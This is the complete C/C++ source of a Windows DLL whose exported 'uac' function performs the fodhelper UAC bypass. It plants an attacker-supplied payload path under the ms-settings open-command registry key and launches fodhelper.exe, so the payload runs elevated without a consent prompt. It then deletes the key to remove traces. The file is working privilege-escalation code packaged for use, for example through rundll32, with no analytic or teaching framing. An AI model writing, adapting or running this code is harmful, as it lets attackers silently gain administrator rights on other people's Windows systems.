#include<Windows.h>

BOOL fodhelper(char* payloadPath) {
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    HKEY hKey;

    si.cb = sizeof(STARTUPINFO);
    RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);
    RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)payloadPath, strlen(payloadPath));
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
    CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
    Sleep(1000);
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    return TRUE;
}

extern "C" __declspec(dllexport)
void uac(
    HWND hwnd,        // handle to owner window   
    HINSTANCE hinst,  // instance handle for the DLL   
    LPTSTR lpCmdLine, // string the DLL will parse   
    int nCmdShow      // show state   
)
{
    if (strlen(lpCmdLine) != 0)
    {
        fodhelper(lpCmdLine);
    }
    else
    {
        exit(-1);
    }
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

